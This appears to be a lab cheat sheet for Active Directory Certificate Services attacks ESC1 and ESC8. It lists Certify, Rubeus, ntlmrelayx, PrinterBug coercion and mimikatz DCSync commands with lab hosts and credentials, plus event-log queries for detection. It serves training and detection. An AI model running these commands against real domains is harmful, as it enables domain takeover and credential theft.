# PKI - ESC1

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `.\Certify.exe find /vulnerable` | Using the Certify.exe tool to scan for vulnerabilities in PKI infrastructure. |
| `.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator` | Using the Certify.exe tool to obtain a certifcate from the vulnerable template |
| `openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx` | Command to convert a `PEM` certificate to a `PFX` certificate.
| `.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt` | Using the Rubeus.exe tool to request a TGT for the domain Administrator by way of forged certifcate. |
| `runas /user:eagle\htb-student powershell`                  | Start a new instance as powershell as the htb-student user. |
| `New-PSSession PKI`                                         | Start a new remote powershell session on the `PKI` machine. |
| `Enter-PSSession PKI`                                       | Enter a remote powershell session on the `PKI` machine. |
| `Get-WINEvent -FilterHashtable @{Logname='Security'; ID='4887'}` | Using the Get-WinEvent cmdlet to view windows Event 4887 |
| `$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}` | Command used to save the events into an array |
| `$events[0] \| Format-List -Property *`                      | Command to view events within the array. The `0` can be adjusted to a different number to match the corresponding event |


# PKI & Coercing - ESC8

| Command                                                      | Description                                                  |
| ------------------------------------------------------------ | ------------------------------------------------------------ |
| `impacket-ntlmrelayx -t http://172.16.18.15/certsrv/default.asp --template DomainController -smb2support --adcs`         | Command to forward incoming connections to the CA. The `--adcs` switch makes the tool parse and display the certificate if one is received. |
| `python3 ./dementor.py 172.16.18.20 172.16.18.4 -u bob -d eagle.local -p Slavi123` | Using the PrinterBug to trigger a connection back to the attacker. |
| `xfreerdp /u:bob /p:Slavi123 /v:172.16.18.25 /dynamic-resolution `            | Connecting to WS001 from the Kali host using RDP. |
| `.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<b64 encoded cert>` | Using Rubeus.exe to ask for a TGT by way of base 64 encoded certificate. |
| `mimikatz.exe "lsadump::dcsync /user:Administrator" exit `            | Using mimikatz.exe to DCsync the `administrator` user. This is performed once the TGT for DC2 has been passed to the current session. |
| `evil-winrm -i 172.16.18.15 -u htb-student -p 'HTB_@cademy_stdnt!'` | Connecting to PKI from the Kali Host using evil-winrm. |
